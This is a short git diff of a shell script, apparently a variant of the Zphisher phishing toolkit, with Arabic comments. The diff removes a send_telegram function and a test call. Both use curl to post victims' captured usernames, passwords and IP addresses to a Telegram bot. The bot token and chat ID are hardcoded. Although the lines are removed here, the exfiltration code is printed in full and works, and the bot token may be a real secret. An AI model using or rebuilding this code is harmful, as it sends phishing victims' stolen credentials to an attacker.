@@ -902,23 +902,6 @@ main_menu() {
 	esac
 }
 
-# إرسال إلى تلجرام
-send_telegram() {
-    # استخدم المتغيرات من Railway إذا موجودة، وإلا استخدم الثوابت
-    TOKEN="${TELEGRAM_BOT_TOKEN:-8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM}"
-    CHAT="${CHAT_ID:-6840048574}"
-    
-    MSG="🔔 *بيانات جديدة* 🔔
-👤 *اليوزر:* $1
-🔑 *الباسورد:* $2
-🌍 *الآي بي:* $3
-⏰ *الوقت:* $(date)"
-    
-    curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
-        -d chat_id="$CHAT" \
-        -d text="$MSG" \
-        -d parse_mode="Markdown" > /dev/null
-}
 
 
 ## Main
@@ -927,6 +910,4 @@ dependencies
 check_status
 install_cloudflared
 install_localxpose
-# اختبار مباشر للدالة
-curl -s -X POST "https://api.telegram.org/bot8450258813:AAHCKf6i3a3QR-4R5k7IpmooXOJv2lX8zRM/sendMessage" -d chat_id="6840048574" -d text="Test from Zphisher" > /dev/null
 main_menu
